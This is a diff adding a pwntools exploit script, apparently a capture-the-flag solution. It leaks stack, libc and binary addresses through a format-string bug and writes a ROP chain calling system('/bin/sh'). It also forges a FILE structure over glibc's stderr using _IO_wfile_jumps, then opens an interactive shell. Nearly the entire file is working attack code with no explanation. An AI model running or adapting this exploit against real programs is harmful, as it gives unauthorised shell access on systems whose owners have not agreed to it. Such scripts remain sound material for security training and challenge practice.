@@ -1,0 +1,101 @@
+from pwn import *
+
+context.log_level = "debug"
+context.arch = "amd64"
+context.os = "linux"
+context.terminal = ["/usr/bin/tmux", "sp", "-h"]
+
+f_remote = True if "remote" in sys.argv else False
+f_gdb = True if "gdb" in sys.argv else False
+
+vuln_path = "./main.patch"
+elf = ELF(vuln_path)
+libc = elf.libc
+
+io = process([vuln_path]) if not f_remote else remote("", 9999)
+
+
+def ddebug(b=""):
+    if not f_gdb:
+        return
+    gdb.attach(io, gdbscript=b)
+    pause()
+
+# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
+
+io.sendline(b"--%12$p--%16$p--%67$p--")
+io.recvuntil("--", drop=True)
+leak = int(io.recv(14), 16)
+rbp = leak + 0xd0
+log.success("rbp:-----> " + hex(rbp))
+
+io.recvuntil("--", drop=True)
+leak = int(io.recv(14), 16)
+libc.address = leak - 0x5ee728
+log.success("libc :-----> " + hex(libc.address))
+
+io.recvuntil("--", drop=True)
+leak = int(io.recv(14), 16)
+elf.address = leak - 0x124d
+log.success("elf :-----> " + hex(elf.address))
+
+
+system_addr = libc.symbols.get("system")
+binsh_addr = next(libc.search("/bin/sh"))
+pop_rdi = next(libc.search(asm("pop rdi; ret")))
+ret = next(libc.search(asm("ret")))
+
+p = {
+    rbp-0x214:212,
+    rbp+8: pop_rdi,
+    rbp+8*2: binsh_addr,
+    rbp+8*3: ret,
+    rbp+8*4: system_addr,
+}
+payload = fmtstr_payload(8, p, write_size="short")
+# io.sendline(payload)
+
+file = FileStructure(0)
+file.flags = u64(p32(0xfbad0101) + b";sh\0")
+file._IO_save_end = libc.sym["system"]
+file._lock = libc.symbols["_IO_2_1_stderr_"] - 0x10
+file._wide_data = libc.symbols["_IO_2_1_stderr_"] - 0x10
+file._offset = 0
+file._old_offset = 0
+payload = b"\x00"*24 + p32(1) + p32(0) + p64(0) 
+payload += p64(libc.symbols["_IO_2_1_stderr_"] - 0x10) 
+payload += p64(libc.symbols["_IO_wfile_jumps"] + 0x18 - 0x58)
+file.unknown2 = payload
+
+fake_len = len(bytes(file)) #29*8
+bs = bytes(file)
+fake_file_addr = elf.address + 0x4200
+p= {}
+
+stderr_adr = libc.symbols["_IO_2_1_stderr_"]
+for i in range(29):
+    p[stderr_adr + 8*i] = u64(bs[8*i:8*(i+1)])
+
+for i,j in p.items():
+    log.success(hex(i) + "---" + hex(j))
+    p2 = {i:j}
+    payload = fmtstr_payload(8, p2, write_size="byte")
+    io.sendline(payload)
+
+
+# p2 = {stderr_adr: fake_file_addr}
+# log.success(hex(stderr_adr) + "---" + hex(fake_file_addr))
+# payload = fmtstr_payload(8, p2, write_size="byte")
+# io.sendline(payload)
+
+log.success("stderr_addr :-----> " + hex(stderr_adr))
+
+p2 = {rbp-0x214:1000}
+log.success(hex(rbp-0x214) + "---" + hex(1000))
+payload = fmtstr_payload(8, p2, write_size="byte")
+ddebug("breakrva 0x011FA\n continue")
+io.sendline(payload)
+
+
+
+io.interactive()
